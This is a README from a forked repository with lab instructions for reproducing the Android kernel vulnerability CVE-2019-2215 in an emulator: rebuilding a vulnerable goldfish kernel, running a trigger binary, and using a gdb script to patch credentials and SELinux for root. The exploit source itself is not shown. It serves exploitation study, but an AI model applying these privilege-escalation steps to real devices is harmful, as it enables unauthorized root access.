# Android Kernel Exploitation CVE-2019-2215

> **_NOTE:_**  This is a forker repository with added instructions and with a fixed patch.

## Original Work 

Please support the original authors of the exploit and instructions on how to execute this exploit:

* https://github.com/cloudfuzz/android-kernel-exploitation
* https://cloudfuzz.github.io/android-kernel-exploitation/

I added a fix to the `path/cve-2019-2215.patch` file. As it was needed to be able to compile the Kernel, else you'd get a `multiple definition of yylloc scripts/dtc/dtc-lexer.lex.o:(.bss+0x0): first defined here` error. 

> **_NOTE:_** You need to have Android Studio installed with `CMAKE` and `NDK` from the SDK Manager, and create a Virtual Device of a Pixel 2 with Running Android `10.0`.

## Cloning the Android Kernel Version

> **_NOTE:_**  Make sure you have the repo tool installed on your machine. https://source.android.com/docs/setup/build/downloading?hl=es-419#installing-repo

1. Go inside the `android-4.14-dev` directory

2. Get metadata of the repository with this command:

  ```bash
    repo init --depth=1 https://android.googlesource.com/kernel/manifest -b q-goldfish-android-goldfish-4.14-dev
  ```
3. Copy the manifest file from `custom-manifest/default.xml` to the `android-4.14-dev/.repo` directory, as we just want to download an specific commit before the vulnerability was patched. More info about this in https://cloudfuzz.github.io/android-kernel-exploitation/
  
  ```bash
    cp ../custom-manifest/default.xml .repo/manifests/
  ```
4. Execute the following to clone the repository:

  ```bash
    repo sync -c --no-tags --no-clone-bundle -j`nproc`
  ```
5. Apply the patch to make the kernel vulnerable to *CVE-2019-2215* again, inside the `android-4.14-dev/goldfish` directory
  ```bash
    git apply ../patch/cve-2019-2215.patch
  ```
## Docker for building kernel

We are going to use docker to build kernel as the packages required (mostly `gcc`) needed to compile this specific verdion of the Android Kernel are old, and it would require a lot of work and time to look into the details. The `Dockerfile` works fine.

```bash
  # Build the docker image
  docker build -t and-build-env .
  # Run the docker
  docker run -d --rm -it and-build-env
```

### Mounting the Filesystem 
Mount the repository to the docker container to be able to compile the kernel and have everything in the same path as the host.

#### Example:
If this cloned repository is inside the `/workspaces/exploits` directory of your host machine, you need to mount the directory inside the `/workspaces/exploits`` directory of the docker container, else you are going to get compilation errors of directories not found.

```bash
docker run -it -v /workspaces/exploits/:/workspaces/exploits bash
```

1. Inside the android-4.14-dev/ directory using docker, execute the following to build the kernel:

```bash
  BUILD_CONFIG=../build-configs/goldfish.x86_64.kasan build/build.sh
```

2. Once is built you can open another shell.

## Building the Exploit

Assuming you have Android Studio installed, and you are using a linux distribution (Ubuntu 2022.04.3 in this case). To build the exploit you need to do the following:

1. Install Google Emulator

  ```bash
    sudo apt install google-android-emulator-installer
  ```


2. Load more environmentals variables to use the `adb` tool from Android Studio:
export PATH="$PATH:$HOME/Android/Sdk/platform-tools/"

3. In a different shell, execute the following to turn on the Pixel 2 Virtual Device with the new built kernel:

  ```bash
    cd android-4.14-dev/out/kasan/dist
    emulator -show-kernel -no-snapshot -wipe-data -avd CVE-2019-2215 -kernel bzImage
  ```

4. On the previous shell, load NDK (provided by Android Studio) to make the exploit inside the `exploit/` directory
  ```bash
    NDK_ROOT=~/Android/Sdk/ndk/26.1.10909125/ make build-trigger push-trigger
  ```
5. Log in into the Pixel 2 Virtual device:
  ```bash
    adb shell
  ```
6. Execute the following:

  ```bash
    generic_x86:/ $ cd data/local/tmp                                                                        
    generic_x86:/data/local/tmp $ ls
    cve-2019-2215-trigger 
    generic_x86:/data/local/tmp $ ./cve-2019-2215-trigger
  ```

7. Once the trigger has been sucessfully executed. Turn off your virtual device
8. Turn it on again with the -qemu flag and debug flags, as they are needed to become root.

  ```bash
    emulator -show-kernel -no-snapshot -wipe-data -avd CVE-2019-2215 -kernel bzImage -qemu -s -S
  ```

9. On a different shell, execute the following:

  ```bash
    cd gdb/
    gdb -quiet ../android-4.14-dev/out/kasan/dist/vmlinux -ex "target remote :1234"
  ```

10. After a while, in the gdb shell, press ¨c" to continue the booting process of the device.
11. Once the device is on, log in into the device with the shell you used to execute step #5.
12. If you execute `id` you should the following:

  ```bash
    generic_x86:/ $ id
    uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
  ```

13. As you see, we aren´t root yet, execute `pidof sh` to get the pid of the shell. We are going to use it to become root. 

13. On the gdb shell, press `ctrl-c`, and the execute `source root-me.py`, then execute `root-by-pid` with the PID you got previously, and finally c to conitnue. You should see the following:

  ```bash
    (gdb) c
    Continuing.
    c
    ^C
    Thread 1 received signal SIGINT, Interrupt.
    on_stack (info=<optimized out>, addr=0xffff8880355e7c00, len=<optimized out>) at /home/tomas/exploits/android-kernel-exploitation/android-4.14-dev/goldfish/arch/x86/include/asm/stacktrace.h:45
    45			addr >= begin && addr < end &&
    (gdb) source root-me.py
    (gdb) root-by-pid 4740
    [+] Rooting
        [*] PID: 4740
        [*] Cmd: sh
        [*] Task: 0xffff88804a8e8040
    [+] Patching cred
        [*] Cred: 0xffff88804b4628c0
    [+] Patching selinux_enforcing
        [*] selinux_enforcing: 0xffffffff820efe98 <selinux_enforcing>
    [*] Rooting complete
    (gdb) c
    Continuing.
  ```

15. On the adb shell, if you execute `id` again, you should see that you have become `root`.

  ```bash
    generic_x86:/ $ id
    uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
  ```

## Original Author

**Ashfaq Ansari ([@HackSysTeam](https://twitter.com/HackSysTeam))** of **[CloudFuzz](https://cloudfuzz.io)**.